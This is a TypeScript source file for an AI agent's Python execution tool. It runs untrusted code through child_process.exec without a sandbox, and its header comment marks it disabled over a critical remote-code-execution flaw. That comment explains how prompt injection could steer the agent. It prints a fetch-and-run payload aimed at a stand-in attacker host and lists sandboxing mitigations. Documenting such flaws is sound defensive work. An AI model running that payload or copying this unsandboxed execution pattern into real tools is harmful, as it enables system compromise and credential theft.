/**
 * ⚠️ SECURITY WARNING: THIS TOOL IS DISABLED DUE TO CRITICAL RCE VULNERABILITY ⚠️
 * 
 * VULNERABILITY: Remote Code Execution (RCE)
 * SEVERITY: CRITICAL
 * CVE: Pending
 * 
 * ISSUE:
 * This tool uses child_process.exec() to execute arbitrary Python code without proper sandboxing.
 * Timeout and maxBuffer are NOT sufficient security controls.
 * 
 * ATTACK VECTOR:
 * An attacker can manipulate the AI agent via prompt injection to execute malicious code:
 * Example: "import os; os.system('curl attacker.com/shell.sh | bash')"
 * 
 * IMPACT:
 * - Complete system compromise
 * - Data exfiltration (database credentials, API keys, user data)
 * - Denial of Service (resource exhaustion, system shutdown)
 * - Lateral movement to other systems
 * 
 * MITIGATION (Required before re-enabling):
 * 1. Implement containerized execution (Docker with --security-opt no-new-privileges)
 * 2. Use syscall filtering (seccomp profiles)
 * 3. Network isolation (no outbound connections)
 * 4. Resource limits (cgroups: CPU, memory, disk I/O)
 * 5. Read-only filesystem with minimal writable /tmp
 * 6. Run as non-root user with minimal capabilities
 * 7. Implement code static analysis before execution
 * 8. Add execution audit logging
 * 
 * ALTERNATIVES:
 * - Use WebAssembly sandboxed execution
 * - Use Firecracker microVMs
 * - Use gVisor for kernel-level isolation
 * 
 * STATUS: DISABLED in server/agent/tools/index.ts
 * DO NOT RE-ENABLE WITHOUT IMPLEMENTING PROPER SANDBOXING
 */

import type { AgentObservation } from "../react-engine";
import { exec } from "child_process";
import { promisify } from "util";
import fs from "fs/promises";
import path from "path";

const execAsync = promisify(exec);

export async function execSandbox(input: { code: string; language?: string; timeout?: number }): Promise<AgentObservation> {
  const language = input.language || "python";
  const timeout = input.timeout || 5000;
  
  if (language !== "python") {
    return {
      observation: `Language '${language}' not supported. Only Python is supported.`,
      success: false,
    };
  }
  
  try {
    // Write code to temp file
    const tempFile = path.join("/tmp", `exec_${Date.now()}.py`);
    await fs.writeFile(tempFile, input.code);
    
    // Execute with timeout and resource limits
    const { stdout, stderr } = await execAsync(`python3 ${tempFile}`, {
      timeout,
      maxBuffer: 1024 * 1024, // 1MB
    });
    
    // Cleanup
    await fs.unlink(tempFile).catch(() => {});
    
    const output = stdout || stderr;
    return {
      observation: output || "Code executed successfully (no output)",
      success: true,
      metadata: { language, executionTime: timeout },
    };
  } catch (error: any) {
    return {
      observation: `Execution failed: ${error.message}`,
      success: false,
      errorMessage: error.message,
    };
  }
}
